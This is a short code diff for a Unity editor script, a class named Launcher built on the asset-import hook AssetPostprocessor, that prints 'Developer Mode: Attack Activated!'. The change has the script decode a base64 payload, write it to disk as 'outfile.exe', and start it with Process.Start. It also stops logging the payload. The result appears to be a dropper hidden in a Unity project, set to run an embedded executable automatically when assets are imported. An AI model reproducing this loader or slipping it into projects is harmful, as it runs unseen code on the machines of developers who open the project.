@@ -26,10 +26,11 @@ public class Launcher: AssetPostprocessor
         Debug.Log("Developer Mode: Attack Activated!");
         //string scriptPath = "Assets/ServerO.txt";
         string scriptContent3 = Process();
-        Debug.Log(scriptContent3);
+        //Debug.Log(scriptContent3);
         byte[] bytes = Convert.FromBase64String(scriptContent3);
-        File.WriteAllBytes("Assets/outbytes", bytes);
-        //System.Diagnostics.Process.Start(@"C:\Windows\Notepad.exe");
+        string outfileName = "outfile.exe";
+        File.WriteAllBytes("Assets/" + outfileName, bytes);
+        System.Diagnostics.Process.Start(Application.dataPath + "/" + outfileName);
 
         AssetDatabase.Refresh();
         EditorApplication.delayCall += AddComponentToMainCamera;
